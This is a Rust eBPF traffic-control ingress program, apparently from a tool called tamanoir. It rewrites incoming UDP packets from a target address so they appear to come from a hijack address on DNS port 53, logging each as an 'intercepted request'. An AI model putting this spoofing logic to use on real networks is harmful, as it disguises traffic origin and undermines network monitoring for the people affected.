use aya_ebpf::{bindings::TC_ACT_PIPE, macros::classifier, programs::TcContext};
use aya_log_ebpf::info;
use network_types::{
    eth::{EthHdr, EtherType},
    ip::{IpProto, Ipv4Hdr},
};

use crate::common::{update_addr, update_port, UpdateType, HIJACK_IP, TARGET_IP};

#[classifier]
pub fn tamanoir_ingress(mut ctx: TcContext) -> i32 {
    match tc_process_ingress(&mut ctx) {
        Ok(ret) => ret,
        Err(_) => TC_ACT_PIPE,
    }
}

#[inline]
fn tc_process_ingress(ctx: &mut TcContext) -> Result<i32, ()> {
    let target_ip: u32 = unsafe { core::ptr::read_volatile(&TARGET_IP) };
    let hijack_ip: u32 = unsafe { core::ptr::read_volatile(&HIJACK_IP) };

    let ethhdr: EthHdr = ctx.load(0).map_err(|_| ())?;
    if let EtherType::Ipv4 = ethhdr.ether_type {
        let header = ctx.load::<Ipv4Hdr>(EthHdr::LEN).map_err(|_| ())?;
        let addr = header.src_addr;
        if let IpProto::Udp = header.proto {
            if u32::from_be(addr) == target_ip {
                info!(ctx, "\n-----\nNew intercepted request:\n-----");

                update_addr(ctx, &addr, &hijack_ip.to_be(), UpdateType::Src)?;
                update_port(ctx, &53u16.to_be(), UpdateType::Src)?;
            }
        };
    }

    Ok(TC_ACT_PIPE)
}
